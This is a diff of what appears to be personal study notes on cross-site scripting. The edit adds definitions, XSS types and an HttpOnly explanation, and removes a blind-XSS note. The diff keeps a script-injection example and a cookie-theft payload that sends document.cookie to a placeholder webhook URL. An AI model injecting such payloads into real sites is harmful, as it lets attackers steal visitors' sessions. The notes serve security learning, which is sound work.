@@ -1,3 +1,9 @@
+Cross-Site Scripting (XSS) is a web application injection vulnerability where an attacker injects malicious client-side scripts into a web page due to improper input validation or output encoding. When another user visits the page, the script executes in their browser. There are three types: Reflected XSS, Stored XSS, and DOM-Based XSS. The impact includes session hijacking, cookie theft, phishing, and unauthorized actions. It can be prevented using input validation, output encoding, Content Security Policy (CSP), and secure coding practices.
+
+
+
+
+
 **Cross-site Scripting (XSS) :**
 
 * It is type of Injection.
@@ -9,9 +15,19 @@
 
 **Types of XSS:**
 
-1. Reflected (RXSS): Inserted Data is reflected somewhere in application, where we perform XSS.
-2. Stored (SXSS): Perform XSS in Database/storage by storing malicious code in them.
-3. DOM (DOM-XSS): web application’s JavaScript reads data from an untrusted "source" and passes it to an unsafe "sink".
+1. **Reflected XSS:** The malicious input is immediately reflected in the server's response and executed in the victim's browser.
+
+**2. Stored XSS:** The malicious script is permanently stored in the application's database or other storage and is executed whenever users view the affected content.
+
+**3. DOM-Based XSS:** The vulnerability exists in the client-side JavaScript, where untrusted data is processed in an unsafe way without proper sanitization.
+
+
+
+
+
+**# Why is HttpOnly important?**
+
+The HttpOnly cookie attribute helps prevent client-side JavaScript from accessing session cookies, reducing the risk of session cookie theft through XSS. However, it does not prevent XSS itself.
 
 
 
@@ -67,14 +83,6 @@ eg. <input .... value="abc"><script>alert('1')</script>
 
 <script>
 var img = document.createElement("img");
-img.src="WEBHOOK\\\\\\\_URL"+"/cookie="+encodeURIComponent(document.cookie);
+img.src="WEBHOOK\\\\\\\\\\\\\\\_URL"+"/cookie="+encodeURIComponent(document.cookie);
 document.body.appendChild(img);
-</script>
-
-
-\*\*\*Blind Store XSS:\*\*\*
-
-XSS hunter 			....website is used to get and active all the time to monitor and capture xss data.
-website: \*https://xsshunter.trufflesecurity.com/app/#/\*
-
 
